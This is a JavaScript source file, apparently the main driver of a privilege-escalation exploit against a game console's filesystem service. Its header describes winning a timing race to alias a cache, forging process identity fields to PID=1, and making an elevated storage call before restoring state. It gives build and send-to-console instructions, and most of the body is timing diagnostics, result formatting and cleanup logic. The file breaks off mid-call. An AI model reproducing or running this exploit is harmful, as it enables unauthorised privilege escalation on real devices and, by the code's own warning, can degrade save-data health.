// ============================================================
// CivSwitchFS — FS identity-promotion payload
// ============================================================
// Risk: HIGH — runs up to 10 complete acquisition campaigns in one payload.
// Each campaign uses the cache-acquisition workflow, creates temporary
// save:/hole files, writes up to 8 MiB of dirty data per wave, and commits
// cleanup. Repeated save-FS churn can degrade save health.
//
// What it does:
//   1. Acquires and qualifies the fsp-srv cache alias through the reserved-gap
//      timing window.
//   2. Discovers and verifies the current root, NCA, and save identity
//      objects, then installs the retained two-bucket memory endpoint.
//   3. Temporarily writes PID=1 to the verified identity fields and makes one
//      elevated OpenContentStorageFileSystem(User=1) call (fsp-srv cmd 110).
//   4. Lists `/` through the returned User filesystem, closes the handles, and
//      restores the exact original objects in reverse order.
//   5. Retires the retained endpoint and removes the temporary save:/hole
//      tree, verifying handle closure and tracked allocations.
//
// Scope and safety:
//   - Every campaign starts from fresh discovery; no prior-run address or PID
//     is used as a lookup input.
//   - Promotion is temporary. The elevated call runs only after all three PID
//     fields read back as 1.
//   - No BIS command is issued. The User=1 selector is a storage ID, not the
//     forged process PID.
//   - A failed restoration, endpoint retirement, or cleanup skips the retry
//     path; restart the console before running the payload again.
//   - Success requires the User content-storage root listing to return
//     transport 0 and result 0. Qualified timing windows do not guarantee a
//     canary flip.
//
// Usage: build with `npm run build`, then send with
// `npm run send -- <console-ip>`.
// ============================================================

import coreRuntime, {setLogPolicy, waitMs} from "./core/runtime.mjs";
import {createFspIdentityConfig} from "./core/config.mjs";
import {
  borrowRawThreadScheduling,
  openFspSessions,
  createScratchTree,
  openStorageAndClones,
  openTriggerHandles,
  allocatePacketBuffers,
  buildIpcRequests,
  checkPathPair,
  applyCmifContexts,
  prepareWaveInfrastructure,
  runControlWaveLoop,
  preparePostCanaryCandidate,
  installCacheAlias,
  prepareReleaseNeighbors,
  captureReleaseBaseline,
  releaseNeighborsAndFindPointers,
  qualifyAddressPlan,
  retireCandidateCacheAndClose,
  cleanupScratchAndHandles
} from "./core/steps.mjs";
import {createFspIdentityHelpers} from "./core/helpers.mjs";
import {runPromotionStep} from "./core/promotion.mjs";

const {
    allocPage,
    beginAllocationTracking,
    checkWindow,
    cloneFsSession,
    closeHandle,
    cmifReply,
    endAllocationTracking,
    extractRoleTimings,
    freeTrackedAllocations,
    ipcCommitChecked,
    ipcDeleteDirectoryRecursivelyChecked,
    log,
    prepPacket,
    read32,
    sendIPC,
    write32,
    writeStr,
    writeXDesc
} = coreRuntime;

const STAGE_LOG_MARKER = "\u0001stage:";
const MAX_ATTEMPTS = 10;
const RETRY_PAUSE_MS = 250;
const SCRATCH_DIR = "/hole";
const NOT_FOUND = 0x202;
let currentAttemptNumber = 0;

function stageOnlyLog(message) {
    if (typeof message === "string" && message.startsWith(STAGE_LOG_MARKER))
        return message.slice(STAGE_LOG_MARKER.length);
    return null;
}

const LOG_PAUSE_MS = 30;

function attemptLogPrefix() {
    const attempt = currentAttemptNumber
        ? "A" + String(currentAttemptNumber).padStart(2, "0") + "/" +
            MAX_ATTEMPTS + " "
        : "035 ";
    return attempt;
}

async function emitFastStage(message) {
    await log(STAGE_LOG_MARKER + attemptLogPrefix() + message);
}

async function emitStage(message) {
    await emitFastStage(message);
    await waitMs(LOG_PAUSE_MS);
}

// Give progress lines a short flush window so the sender surfaces them while
// the longer address, metadata, and root phases are still running.
async function emitProgress(message) {
    await emitFastStage(message);
    await waitMs(LOG_PAUSE_MS);
}

// Canary progress is emitted after wave timing analysis. Avoid a fixed pause
// before the next positive attempt.
async function emitCanaryProgress(message) {
    await emitFastStage(message);
}

function readEntryTypeChecked(handle, path) {
    const pathBuf = allocPage(0x1000);
    const packet = allocPage(0x2000);
    writeStr(pathBuf, path);
    prepPacket(packet, (4 | (1 << 16)) >>> 0, 8, []);
    writeXDesc(packet, 8, pathBuf, path.length + 1);
    write32(packet + 0x10n, 0x49434653n);
    write32(packet + 0x18n, 7n);
    const transport = Number(sendIPC(handle, packet)) >>> 0;
    if (transport !== 0)
        return {transport, result: null, type: null};
    const reply = cmifReply(packet);
    return {transport, result: reply.result,
        type: reply.result === 0
            ? Number(read32(packet + BigInt(reply.data))) >>> 0 : null};
}

async function runHoleCleanupHandler(attemptState) {
    const handle = attemptState.holeCleanupHandle;
    if (!handle) {
        attemptState.holeCleanupVerified = false;
        await emitFastStage("HOLE FALLBACK: no independent save handle; " +
            "absence cannot be verified.");
        return false;
    }

    let initial = null;
    let deletion = null;
    let commit = null;
    let verification = null;
    let reason = null;
    let shouldVerify = false;
    let closeResult = null;
    let absenceVerifiedByPrimary = false;
    try {
        await emitFastStage("HOLE FALLBACK: checking /hole on the reserved " +
            "temporary save handle.");
        if (attemptState.primaryScratchCleanupVerified) {
            absenceVerifiedByPrimary = true;
        } else {
            initial = readEntryTypeChecked(handle, SCRATCH_DIR);
            if (initial.transport !== 0) {
                reason = "initial-check-transport=" +
                    formatCode(initial.transport);
            } else if (initial.result === NOT_FOUND) {
                if (attemptState.primaryCleanupAttempted &&
                    !attemptState.primaryCommitVerified) {
                    commit = ipcCommitChecked(handle);
                    if (commit.transport !== 0 || commit.result !== 0) {
                        reason = "recommit-failed";
                    } else {
                        verification = readEntryTypeChecked(handle, SCRATCH_DIR);
                        if (verification.transport !== 0 ||
                            verification.result !== NOT_FOUND)
                            reason = "absence-verification-failed-after-recommit";
                    }
                } else {
                    // This lookup already proves the path is absent. Do not
                    // issue a second GetEntryType for the same state.
                    verification = initial;
                }
                shouldVerify = !reason && Boolean(verification);
            } else if (initial.result === 0 && initial.type === 0) {
                deletion = ipcDeleteDirectoryRecursivelyChecked(handle, SCRATCH_DIR);
                if (deletion.transport !== 0 || deletion.result !== 0) {
                    reason = "delete-failed";
                } else {
                    commit = ipcCommitChecked(handle);
                    if (commit.transport !== 0 || commit.result !== 0)
                        reason = "commit-failed";
                    else shouldVerify = true;
                }
            } else if (initial.result === 0) {
                reason = "path-exists-but-is-not-a-directory";
            } else {
                reason = "initial-check-result=" + formatCode(initial.result);
            }

            if (shouldVerify && !verification) {
                verification = readEntryTypeChecked(handle, SCRATCH_DIR);
                if (verification.transport !== 0 ||
                    verification.result !== NOT_FOUND)
                    reason = "absence-verification-failed";
            }
        }
    } catch (error) {
        reason = "handler-threw:" + String(error?.message || error);
    } finally {
        try {
            closeResult = Number(closeHandle(handle)) >>> 0;
        } catch (error) {
            reason = reason || "handle-close-threw:" +
                String(error?.message || error);
        }
        attemptState.holeCleanupHandle = 0;
    }

    attemptState.holeCleanupVerified = Boolean(!reason &&
        (absenceVerifiedByPrimary || (shouldVerify &&
            verification?.transport === 0 &&
            verification?.result === NOT_FOUND)) && closeResult === 0);
    if (!attemptState.cleanupVerified && attemptState.holeCleanupVerified &&
        attemptState.primaryCleanupAttempted &&
        attemptState.primaryHandlesClosed &&
        attemptState.endpointRetirementVerified &&
        attemptState.workerStateSafe) {
        attemptState.cleanupVerified = true;
        attemptState.cleanupSummary = "fallback /hole cleanup verified; " +
            "endpoint retired and all primary handles closed";
    }
    const initialText = absenceVerifiedByPrimary ? "primary-cleanup-verified"
        : initial?.transport !== 0
        ? "transport=" + formatCode(initial?.transport)
        : initial?.result === NOT_FOUND ? "already-absent"
        : initial?.result === 0 ? "present-type=" + initial.type
        : "result=" + formatCode(initial?.result);
    const commitText = commit
        ? formatCode(commit.transport) + "/" + formatCode(commit.result)
        : attemptState.primaryCommitVerified ? "primary-verified" : "not-needed";
    await emitFastStage("HOLE FALLBACK: initial=" + initialText +
        "; delete=" + (deletion
            ? formatCode(deletion.transport) + "/" + formatCode(deletion.result)
            : "not-needed") +
        "; commit=" + commitText +
        "; fallbackIpc=" + (absenceVerifiedByPrimary ? "skipped" : "used") +
        "; absent=" + (attemptState.holeCleanupVerified ? "verified" : "no") +
        "; handleClose=" + formatCode(closeResult) +
        (reason ? "; reason=" + reason : "") + ".");
    return attemptState.holeCleanupVerified;
}

function formatCode(value) {
    if (value === null || value === undefined) return "n/a";
    return "0x" + (Number(value) >>> 0).toString(16).padStart(8, "0");
}

function seconds(valueMs) {
    return (valueMs / 1000).toFixed(1) + "s";
}

function formatAddressResults(address, elapsedMs) {
    const profile = address.timingProfile || {};
    const addressReads = profile.addressReads || 0;
    const metadata = profile.metadata || 0;
    const pages = profile.pages || 0;
    const root = profile.root || 0;
    const period = profile.period || 0;
    const rootClear = profile.rootClear || 0;
    const rootRead = profile.rootRead || 0;
    const rootScan = profile.rootScan || 0;
    const rootLookup = profile.rootLookup || 0;
    const rootChunksRead = profile.rootChunksRead || 0;
    const attributed = addressReads + metadata + pages + root + period;
    const other = Math.max(0, elapsedMs - attributed);
    const addressStatus = address.addressReadVerified ? "passed" : "rejected";
    const aliasStatus = address.addressAliasRequalified === null
        ? "not run" : address.addressAliasRequalified ? "passed" : "failed";
    const periodStatus = address.bucketPeriodQualified === null
        ? "not run" : address.bucketPeriodQualified ? "passed" : "failed";
    const rootStatus = address.rootStageVerified ? "verified" :
        (address.addressReadVerified ? "not verified" : "not checked");
    const addressFailure = address.addressFailureReason
        ? "; reason=" + address.addressFailureReason.replace(/-/g, " ") : "";
    const failureDetail = address.addressFailureDetail
        ? "; detail=" + address.addressFailureDetail : "";
    const sizeError = address.storageSizeError !== null
        ? "; storageSizeError=" + formatCode(address.storageSizeError) : "";
    return [
        "Address qualification: read " + addressStatus +
            "; candidates=" + address.addressCandidatesTested +
            "; changed-link seeds=" + address.changedLinkCandidates +
            "; valid plans=" + address.validAddressPlans +
            "; alias recheck=" + aliasStatus +
            "; period=" + periodStatus +
            "; plan-read=" + seconds(addressReads) +
            "; period-time=" + seconds(period) +
            "; total=" + seconds(addressReads + period) +
            addressFailure + failureDetail + sizeError,
        "Metadata: link checks=" + address.metadataAnchorChecks +
            "; valid pages=" + address.metadataPageChecks +
            "; probes=" + address.metadataPageProbes +
            "; discovery=" + seconds(metadata) +
            "; page=" + seconds(pages) +
            "; total=" + seconds(metadata + pages),
        "FSP root: " + rootStatus +
            "; scans=" + address.rootCandidateScans +
            "; PID " + (address.rootPidRead ? "read" : "not read") +
            "; more candidates may qualify=" +
                Boolean(address.rootCandidateRetryable) +
            "; time=" + seconds(root) +
            "; chunks=" + rootChunksRead +
            "; clear/read/scan/lookup=" + seconds(rootClear) + "/" +
                seconds(rootRead) + "/" + seconds(rootScan) + "/" +
                seconds(rootLookup) +
            "; plans/other=" + seconds(other) +
            "; total=" + seconds(elapsedMs)
    ];
}

function formatAliasTiming(alias, elapsedMs) {
    const waves = Number(alias?.copyWavesTotal) || 0;
    const perWave = waves ? seconds(elapsedMs / waves) + "/wave" : "n/a per wave";
    return " (elapsed " + seconds(elapsedMs) + "; " + perWave + ")";
}

function formatFailureSuffix(result) {
    if (!result?.failureReason) return "";
    return " (reason=" + result.failureReason +
        (result.failureDetail ? "; detail=" + result.failureDetail : "") + ")";
}

function median(values) {
    const sorted = values.filter(value => Number.isFinite(value))
        .slice().sort((a, b) => a - b);
    if (!sorted.length) return null;
    const middle = Math.floor(sorted.length / 2);
    return sorted.length % 2 ? sorted[middle]
        : (sorted[middle - 1] + sorted[middle]) / 2;
}

function displayUs(value) {
    return "~" + Math.round(value) + "µs";
}

function humanRoleName(role) {
    const names = {
        commit: "Commit worker",
        bottleneck: "Bottleneck read worker",
        frag0: "Fragment worker 0",
        frag1: "Fragment worker 1",
        frag2: "Fragment worker 2",
        frag3: "Fragment worker 3",
        canary: "Canary lookup worker",
        filler0: "Filler worker 0",
        filler1: "Filler worker 1",
        guard0: "Guard worker 0",
        guard1: "Guard worker 1",
        trigger: "Trigger worker"
    };
    return names[role] || role;
}

function collectTimingIssues(control, config) {
    const records = control.positiveWindowRecords || [];
    const rejected = records.filter(record => !record.window);
    const issues = Object.create(null);
    let triggerSpanMissing = 0;

    const addIssue = (role, kind, delta, wave) => {
        const key = role + ":" + kind;
        const issue = issues[key] || (issues[key] = {
            role, kind, count: 0, values: [], lastWave: null
        });
        if (issue.lastWave !== wave) {
            issue.count++;
            issue.lastWave = wave;
        }
        if (Number.isFinite(delta)) issue.values.push(delta);
    };

    for (const record of rejected) {
        const timings = record.roleTimings || {};
        const trigger = timings.trigger;
        if (!trigger) {
            triggerSpanMissing++;
            continue;
        }
        for (const role of record.shapeMissing || []) {
            const timing = timings[role];
            if (!timing) {
                addIssue(role, "unmeasured", null, record.wave);
                continue;
            }
            if (timing.relStartUs >= 0)
                addIssue(role, "late-start", timing.relStartUs, record.wave);
            if (config.throughRoles.indexOf(role) >= 0 &&
                timing.relEndUs <= trigger.relEndUs) {
                addIssue(role, "early-end-through",
                    trigger.relEndUs - timing.relEndUs, record.wave);
            } else if (config.heldRoles.indexOf(role) >= 0 &&
                timing.relEndUs <= 0) {
                addIssue(role, "early-end-held", -timing.relEndUs, record.wave);
            }
        }
    }

    const ordered = Object.keys(issues).map(key => issues[key])
        .sort((a, b) => b.count - a.count ||
            (median(b.values) || 0) - (median(a.values) || 0));
    const messages = ordered.slice(0, 6).map(issue => {
        const count = issue.count + "/" + rejected.length + " rejected waves";
        if (issue.kind === "unmeasured")
            return humanRoleName(issue.role) + " timing unavailable (" + count + ")";
        const amount = median(issue.values);
        if (issue.kind === "late-start") {
            return amount === 0
                ? humanRoleName(issue.role) + " started at trigger start; it must start earlier (" + count + ")"
                : humanRoleName(issue.role) + " started " + displayUs(amount) +
                    " after trigger start (" + count + ")";
        }
        const boundary = issue.kind === "early-end-through"
            ? "trigger end" : "trigger start";
        return amount === 0
            ? humanRoleName(issue.role) + " ended at " + boundary +
                "; it must run longer (" + count + ")"
            : humanRoleName(issue.role) + " ended " + displayUs(amount) +
                " before " + boundary + " (" + count + ")";
    });

    if (triggerSpanMissing)
        messages.unshift("Trigger timing unavailable (" + triggerSpanMissing +
            "/" + rejected.length + " rejected waves)");
    if (ordered.length > 6)
        messages.push((ordered.length - 6) + " more worker timing issues");
    return {rejected, messages};
}

function summarizePinQualification(control) {
    if (control.pinFirstWaveQualified) return "";
    const pin = control.pinQualificationDiagnostics;
    if (!pin) {
        const attempted = (control.profileCounts || {})["abort-control"] || 0;
        return attempted
            ? "Initial cache pin qualification failed; timing details unavailable."
            : "";
    }

    const issues = [];
    if (!pin.shapeOk) issues.push("pin IPC reply shape failed");
    if (!pin.costOk) issues.push("pin allocation size did not match expected");
    if (!pin.restored) issues.push("heap counters did not restore");
    if (!pin.windowMeasured) {
        issues.push("canary/pin timing spans were not measured");
    } else {
        if (pin.startOffsetUs <= 0) {
            const amount = Math.abs(pin.startOffsetUs);
            issues.push(amount === 0
                ? "Cache pin worker started with Canary; it must start after it"
                : "Cache pin worker started " + displayUs(amount) +
                    " too early relative to Canary");
        }
        if (pin.endMarginUs <= 0) {
            const amount = Math.abs(pin.endMarginUs);
            issues.push(amount === 0
                ? "Cache pin worker ended with Canary; it must finish first"
                : "Cache pin worker ended " + displayUs(amount) +
                    " too late relative to Canary");
        }
        if (!pin.windowOk && pin.startOffsetUs > 0 && pin.endMarginUs > 0)
            issues.push("Cache pin timing did not fit inside the Canary span");
    }
    return issues.length ? "Initial pin: " + issues.join("; ") + "." :
        "Initial cache pin qualification failed.";
}

function humanStopReason(control) {
    const reason = control.workflowStopReason;
    if (!reason) return control.controlsQualified
        ? "positive attempt limit reached" : "control sequence incomplete";
    let match = /^dirty-write-failed-at-wave-(\d+)$/.exec(reason);
    if (match) return "dirty-file write failed at wave " + match[1];
    match = /^reservation-failed-at-wave-(\d+)$/.exec(reason);
    if (match) return "reservation setup failed at wave " + match[1];
    match = /^worker-start-failed-at-wave-(\d+)$/.exec(reason);
    if (match) return "workers failed to start at wave " + match[1];
    match = /^worker-join-failed-at-wave-(\d+)$/.exec(reason);
    if (match) return "workers failed to join at wave " + match[1];
    match = /^profile-setup-failed-(.+)$/.exec(reason);
    if (match) return "could not configure the " + match[1] + " profile";
    return reason.replace(/-/g, " ");
}

function summarizeRejectedGates(control, timing) {
    const counts = control.positiveGateFailures || {};
    const total = (control.positiveWindowRecords || []).length;
    const human = {
        reservation: "reservation group incomplete",
        "workers-done": "not all workers completed",
        transport: "an IPC send failed",
        "workers-join": "not all workers joined",
        "protected-10": "protected worker completion flags missing",
        "release-sent": "release message was not sent",
        signal: "wave completion signal failed",
        tails: "fragment responses were unexpected",
        commit: "Commit worker failed",
        read: "Bottleneck read worker failed",
        "pin-shape": "cache pin reply shape failed",
        "clear-ok": "clear command failed",
        "pre-ok": "pre-release query failed",
        "heap-restore": "heap allocation counters did not restore",
        "pin-cost": "cache pin allocation size mismatch"
    };
    const entries = [];
    for (const [key, count] of Object.entries(counts)) {
        if (key === "shape-10" || key === "margin>=300" ||
            key === "pre-release" || key === "trig-span" ||
            key === "pin-window" || key === "pin-1st") continue;
        if (key === "no-abort") {
            const samples = (timing.rejected || []).map(record => record.guardSamples)
                .filter(Boolean);
            const guardKinds = [];
            if (samples.some(sample => sample.completed)) guardKinds.push("completion");
            if (samples.some(sample => sample.earlyHole)) guardKinds.push("early-hole");
            if (samples.some(sample => sample.spacing)) guardKinds.push("spacing");
            entries.push("worker abort guard fired" +
                (guardKinds.length ? " (" + guardKinds.join(", ") + ")" : "") +
                " (" + count + "/" + total + ")");
        } else if (key === "paths") {
            const changed = new Set();
            for (const record of timing.rejected || []) {
                if ((record.rejections || []).indexOf("paths") < 0) continue;
                for (const path of record.changedPaths || []) changed.add(path);
            }
            const names = Array.from(changed).map(humanRoleName);
            entries.push(names.length
                ? "unexpected result from " + names.join(", ") +
                    " (" + count + "/" + total + ")"
                : "canary/filler/guard result did not match expected status (" +
                    count + "/" + total + ")");
        } else {
            entries.push((human[key] || key.replace(/-/g, " ")) +
                " (" + count + "/" + total + ")");
        }
    }

    if (counts["shape-10"] && !timing.messages.length)
        entries.push("required worker overlap pattern did not qualify");
    if (counts["trig-span"] && !timing.messages.some(message =>
            message.startsWith("Trigger timing")))
        entries.push("Trigger worker span was not measured");
    if (counts["margin>=300"]) {
        const marginRecords = (timing.rejected || []).filter(record =>
            (record.rejections || []).indexOf("margin>=300") >= 0);
        const margins = marginRecords.map(record => record.marginUs);
        const shortages = marginRecords.map(record => record.marginSlackUs)
            .filter(Number.isFinite).map(value => Math.max(0, -value));
        const typicalMargin = median(margins);
        const typicalShortage = median(shortages);
        if (typicalMargin === null) {
            entries.push("Bottleneck/Guard 1 overlap margin was not measured");
        } else {
            entries.push("Bottleneck/Guard 1 overlap was " +
                displayUs(typicalMargin) + " (needs 300µs" +
                (typicalShortage === null ? ")" : "; short by " +
                    displayUs(typicalShortage) + ")") +
                " (" + counts["margin>=300"] + "/" + total + ")" +
                "; extend Bottleneck or start Guard 1 earlier");
        }
    }
    if (counts["pre-release"]) {
        const shortages = (timing.rejected || []).filter(record =>
            (record.rejections || []).indexOf("pre-release") >= 0)
            .map(record => record.preReleaseSlackBytes)
            .filter(Number.isFinite).map(value => Math.max(0, -value));
        const typicalShortage = median(shortages);
        entries.push(typicalShortage === null
            ? "pre-release cache hold was not measured"
            : "pre-release cache hold was ~" +
                Math.round(typicalShortage) + "B below the 0x2600-byte minimum" +
                " (" + counts["pre-release"] + "/" + total + ")");
    }
    const pinIssue = summarizePinQualification(control);
    if (pinIssue) entries.push(pinIssue);

    return entries;
}

function formatCanaryResult(control, config) {
    if (!control) return "Canary run failed before returning a result.";
    if (control.canaryQualified) {
        return "Canary flipped! (positiveAttempts=" +
            control.positiveAttempts + ", qualifiedWindows=" +
            control.positiveWindows + ")";
    }

    const stateLabels = {
        "controls-incomplete": "control sequence incomplete",
        "no-qualified-positive-window": "no qualified positive window",
        "window-valid-no-flip": "qualified window, no flip",
        "raw-flip-outside-window": "flip outside qualified window",
        "post-health-failure": "post-flip health check failed",
        "worker-unsafe": "worker state unsafe"
    };
    const controls = [
        "pin=" + Boolean(control.pinFirstWaveQualified),
        "abort=" + Boolean(control.abortControlPassed),
        "hole=" + Boolean(control.abortHoleControlPassed),
        "extent=" + Boolean(control.extentQualified),
        "negative=" + Boolean(control.negativeControlPassed)
    ].join(",");
    const counts = control.profileCounts || {};
    const attemptsByProfile = "abort=" + (counts["abort-control"] || 0) +
        ",hole=" + (counts["abort-hole-control"] || 0) +
        ",extentAbsent=" + (counts["extent-absent"] || 0) +
        ",extentPresent=" + (counts["extent-present"] || 0) +
        ",negative=" + (counts.negative || 0) +
        ",positive=" + (counts.positive || 0);
    const records = control.positiveWindowRecords || [];
    const timing = collectTimingIssues(control, config);
    const otherIssues = summarizeRejectedGates(control, timing);

    const label = stateLabels[control.campaignState] || control.campaignState;
    const outcome = control.campaignState === "controls-incomplete"
        ? "Canary not qualified"
        : control.campaignState === "worker-unsafe"
        ? "Canary run aborted"
        : control.campaignState === "post-health-failure"
        ? "Canary flip rejected"
        : control.campaignState === "raw-flip-outside-window"
        ? "Canary flip outside qualified window"
        : "Canary didn't flip";
    return outcome + " (" + label + ")" +
        "; controls=" + (control.controlsQualified ? "passed" : "incomplete") +
        "{" + controls + "}" +
        "; attemptsByProfile={" + attemptsByProfile + "}" +
        "; positiveAttempts=" + control.positiveAttempts +
        "; nextProfile=" + (control.nextProfile || "done") +
        "; waveCap=" + config.MAX_CONTROL_WAVES +
        "; stopReason=" + humanStopReason(control) +
        "; worker state " + (control.workerStateSafe ? "safe" : "unsafe") +
        "; qualifiedWindows=" + control.positiveWindows + "/" + records.length +
        "; observedFlips=" + control.positiveObservedRedirects +
        "; outsideWindowFlips=" + control.positiveOutsideWindowFlips +
        "; qualifiedFlips=" + control.positiveQualifiedFlips +
        "; postHealthFailures=" + control.positiveHealthFailures +
        (timing.messages.length
            ? "; timing findings={" + timing.messages.join("; ") + "}" : "") +
        (otherIssues.length
            ? "; other issues={" + otherIssues.join("; ") + "}" : "");
}

function formatCanaryType(type) {
    if (type === 0) return "DIR";
    if (type === 1) return "FILE";
    if (type === null || type === undefined) return "NA";
    return "ERR" + Number(type);
}

async function emitPositiveWindowDiagnostics(control, config) {
    const records = control?.positiveWindowRecords || [];
    for (const record of records) {
        const timingParts = [];
        const timings = record.roleTimings || {};
        for (let index = 0; index < config.roleLabels.length; index++) {
            const role = config.roleLabels[index];
            const timing = timings[role];
            if (!timing) continue;
            timingParts.push(config.roleShort[index] + "=" +
                timing.relStartUs.toFixed(0) + ".." +
                timing.relEndUs.toFixed(0));
        }
        const health = record.postCanaryHealth || {};
        const preRelease = Number.isFinite(record.preReleaseUsed)
            ? "0x" + Math.trunc(record.preReleaseUsed).toString(16) : "NA";
        const margin = Number.isFinite(record.marginUs)
            ? record.marginUs.toFixed(0) + "us" : "NA";
        const trigger = record.triggerResult == null
            ? "NA" : formatCode(record.triggerResult);
        await emitFastStage("CANARY-W" +
            String(record.wave).padStart(2, "0") +
            " window=" + Boolean(record.window) +
            " canary=" + (record.canaryResult == null
                ? "NA" : formatCode(record.canaryResult)) +
            "/" + formatCanaryType(record.canaryType) +
            " redirect=" + Boolean(record.observedRedirect) +
            " qualifiedFlip=" + Boolean(record.qualifiedFlip) +
            " post=" + (health.transport == null
                ? "NA" : formatCode(health.transport)) + "/" +
                (health.result == null ? "NA" : formatCode(health.result)) +
                "/t" + formatCanaryType(health.type) +
                "/healthy=" + Boolean(health.healthy) +
            " preRelease=" + preRelease +
            " margin=" + margin +
            " shape=" + record.shape + "/10" +
            " trigger=" + trigger + "/t" +
                formatCanaryType(record.triggerType) +
                "/aborted=" + Boolean(record.triggerAborted) +
            " changed=" + ((record.changedPaths || []).join(",") || "none") +
            " gates=" + ((record.rejections || []).join(",") || "-") +
            " spans(us=relative-to-trigger):" + timingParts.join(","));
    }
}

function formatAliasResult(alias) {
    if (alias.aliasInstalled) {
        return "Cache alias installed (" + alias.copyStepsCompleted +
            "/7 copy steps; waves=" + alias.copyWavesTotal +").";
    }
    const reasons = Object.keys(alias.copyFailureCounts || {}).sort()
        .map(reason => reason + ":" + alias.copyFailureCounts[reason])
        .join(",") || "none";
    const failedSteps = (alias.copyStepFailures || []).map(step =>
        "step" + step.step + "{reason=" + step.reason +
        ",attempts=" + step.attempts +
        ",windowRejects=" + step.windowRejects +
        ",preReleaseRejects=" + step.preReleaseRejects +
        ",pathMismatches=" + step.pathMismatches + "}")
        .join(",") || "none";
    return "Cache alias was not installed (" + alias.copyStepsCompleted +
        "/7 copy steps; waves=" + alias.copyWavesTotal +
        "; worker state " + (alias.workerStateSafe ? "safe" : "unsafe") +
        "; reason=" + (alias.copyFailureReason || "unknown") +
        "; failures={" + reasons + "}; failedSteps={" + failedSteps + "}).";
}

function promotionSkipReason(address, handles) {
    if (!address.addressReadVerified) return "address-read-not-qualified";
    if (!address.rootStageVerified) return "root-identity-not-verified";
    if (!address.verifiedIdentityTargets) return "identity-targets-unavailable";
    if (!handles.domainSession) return "domain-session-unavailable";
    if (!handles.candidateHandle) return "candidate-storage-unavailable";
    if (!address.addressPlan) return "address-plan-unavailable";
    return "promotion-precondition-failed";
}

function formatPromotionResult(promotion, address, handles) {
    const outcome = promotion.promotionOutcome;
    const pidStatus = outcome && outcome.promoted ? "verified" :
        (promotion.promotionAttempted ? "failed" : "skipped");
    const userFsStatus = !promotion.promotionAttempted || !outcome?.promoted
        ? "not attempted" :
        (outcome && outcome.openedUserFs ? "opened" : "failed");
    const listingStatus = !outcome || !outcome.promoted || !outcome.openedUserFs
        ? "not attempted" :
        (outcome.listedUserRoot ? "read" : "failed");
    const restoreStatus = !promotion.promotionAttempted ? "not needed" :
        (promotion.promotionRestored ? "verified" : "failed");
    let message = "PID fields " + pidStatus +
        "; User filesystem " + userFsStatus +
        "; root listing " + listingStatus;
    if (outcome && outcome.listedUserRoot)
        message += "(" + outcome.listCount + " entries)";
    message += "; restore=" + restoreStatus;
    if (!promotion.promotionAttempted)
        message += "; reason=" + promotionSkipReason(address, handles).replace(/-/g, " ");
    if (outcome && outcome.error)
        message += "; reason=" + outcome.error;
    if (outcome && !promotion.promotionRestored &&
        outcome.restoreFailureDetails?.length)
        message += "; restoreFailures={" +
            outcome.restoreFailureDetails.join(",") + "}";
    if (outcome && outcome.openedUserFs && !outcome.listedUserRoot)
        message += "; listError=" + formatCode(outcome.listResult) +
            "; listTransport=" + formatCode(outcome.listTransport) +
            "; entriesRead=" + outcome.listEntriesRead;
    if (promotion.promotionAttempted && outcome && outcome.promoted && !outcome.openedUserFs)
        message += "; openError=" + outcome.error +
            "; transport=" + formatCode(outcome.openTransport) +
            "; result=" + formatCode(outcome.openResult) +
            "; objects=" + outcome.openObjects;
    if (outcome && outcome.fsCloseResult !== undefined &&
        outcome.fsCloseResult !== 0)
        message += "; UserFS-closeError=" + formatCode(outcome.fsCloseResult);
    return message;
}

function formatCleanupResult(cleanup, workerStateSafe) {
    const counts = "handlesClosed=" + cleanup.handlesClosed + "/" +
        cleanup.expectedHandles;
    if (cleanup.cleanupVerified)
        return "Cleanup complete (" + counts + ").";
    if (cleanup.skipped) {
        return "Cleanup skipped (worker state " +
            (workerStateSafe ? "safe" : "unsafe") + "; reason=" +
            (cleanup.skipReason || "unknown").replace(/-/g, " ") +
            "; " + counts + ").";
    }
    return "Cleanup failed (" + counts +
        "; deleteTransport=" + formatCode(cleanup.deleteTransport) +
        "; deleteResult=" + formatCode(cleanup.deleteResult) +
        "; commitTransport=" + formatCode(cleanup.commitTransport) +
        "; commitResult=" + formatCode(cleanup.commitResult) +
        "; closeErrors=" + ((cleanup.closeErrors || []).join(",") || "none") +
        "; errors=" + ((cleanup.errors || []).join(",") || "none") + ").";
}

function formatRetirementResult(retired) {
    if (!retired?.ok || retired?.failureReason) {
        return "Endpoint retirement or close failed (reason=" +
            (retired?.failureReason || "cleanup-safety-not-verified") +
            "; close=" + formatCode(retired?.candidateCloseResult) + ").";
    }
    if (retired.candidateCacheRetired)
        return "Candidate cache retired and candidate storage closed.";
    if (!retired.candidateHandle)
        return "Endpoint retirement was not needed; candidate storage closed.";
    return "Endpoint retirement is incomplete; candidate storage remains open.";
}

async function performStopAndCleanup({
    reason,
    scratch,
    handles,
    helpers,
    addressCopy = null,
    candidateCacheNeedsRetirement = false,
    workerStateSafe = true,
    domainSession = null
}) {
    await emitStage(reason);

    let retired = {
        addressCopy,
        candidateHandle: handles?.candidateHandle || 0,
        candidateCacheRetired: Boolean(addressCopy?.candidateCacheRetired),
        workerStateSafe: Boolean(workerStateSafe)
    };
    if (retired.candidateHandle) {
        await emitStage("Retiring the candidate cache before cleanup...");
        retired = await retireCandidateCacheAndClose({
            helpers,
            addressCopy,
            candidateCacheNeedsRetirement:
                candidateCacheNeedsRetirement ||
                Boolean(addressCopy?.candidateCacheNeedsRetirement),
            candidateHandle: retired.candidateHandle,
            retireRetainedEndpoint: null,
            workerStateSafe: Boolean(workerStateSafe)
        });
        await emitStage(formatRetirementResult(retired));
    }

    const finalAddressCopy = retired.addressCopy || addressCopy || {};
    const finalWorkerStateSafe = Boolean(
        retired.workerStateSafe ?? workerStateSafe);
    await emitStage("Removing save:/hole and closing the remaining handles...");
    const cleanup = await cleanupScratchAndHandles({
        SCRATCH_DIR: scratch?.SCRATCH_DIR,
        auxiliaryStorageHandle: handles?.auxiliaryStorageHandle || 0,
        candidateHandle: retired.candidateHandle || 0,
        candidateCacheNeedsRetirement: candidateCacheNeedsRetirement ||
            Boolean(finalAddressCopy.candidateCacheNeedsRetirement),
        candidateCacheRetired: Boolean(retired.candidateCacheRetired ||
            finalAddressCopy.candidateCacheRetired),
        retainedEndpointActive: Boolean(finalAddressCopy.retainedEndpointActive),
        domainSession: domainSession || handles?.domainSession || null,
        extentTriggerHandle: handles?.extentTriggerHandle || 0,
        extraStorages: handles?.extraStorages || [],
        pinHandle: handles?.pinHandle || 0,
        rootClones: handles?.rootClones || [],
        rootSession: handles?.rootSession || 0,
        saveClones: handles?.saveClones || [],
        savedHandle: handles?.savedHandle || 0,
